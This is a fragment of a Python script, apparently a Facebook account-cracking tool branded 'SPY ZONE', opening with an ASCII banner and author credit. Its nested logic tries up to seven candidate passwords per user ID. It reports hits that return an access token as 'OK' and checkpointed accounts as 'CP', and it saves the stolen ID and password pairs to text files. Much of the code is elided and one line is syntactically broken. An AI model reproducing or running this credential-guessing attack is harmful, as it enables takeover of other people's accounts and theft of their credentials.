...
\033[1;91m_____ _______     __   __________  _   _ ______
\033[1;91m/ ____|  __ \ \   / /  |___  / __ \| \ | |  ____|
\033[1;91m| (___ | |__) \ \_/ /_____ / / |  | |  \| | |__
\033[1;91m\___ \|  ___/ \   /______/ /| |  | | . ` |  __|
\033[1;91m____) | |      | |      / /_| |__| | |\  | |____
\033[1;91m|_____/|_|      |_|     /_____\____/|_| \_|______|
\033[1;91m-----------------------------------------------

\033[1;93m AUTHOR  : SPY ZONE

\033[1;92m WhatsApp : +88018*******2

\033[1;91m-----------------------------------------------

\033[1;92m BOSS : SPY ZONE 
...
def menu_select():
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;97m[SPY] = OK] "+uid+" = "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;93m[SPY]>CP] "+uid+" = "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;97m[SPY = OK] "+uid+" = "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;93m[SPY>CP] "+uid+" = "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print("\x1b[1;97m[SPY = OK] "+uid+" = "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;93m[SPY>CP] "+uid+" = "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;97m[SPY = OK] "+uid+" = "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;97m[SPY = OK] "+uid+" = "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;93m[SPY>CP] "+uid+" = "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;97m[SPY = OK] "+uid+" = "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;93m[SPY>CP] "+uid+" = "+pass7)
		                                                        cp=open("mzcp.txt","a"
		                                                        cp.write(uid+" = "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;97m[SPY = OK] "+uid+" = "+pass7+"\x1b[1;0m")
		                                                            ok=open("mzok.txt","a")
		                                                            ok.write(uid+" = "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
	...
	print ("[!] ALLAH  HAFIZ (BOSS) SPY-ZONE Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
	print (47*"-")
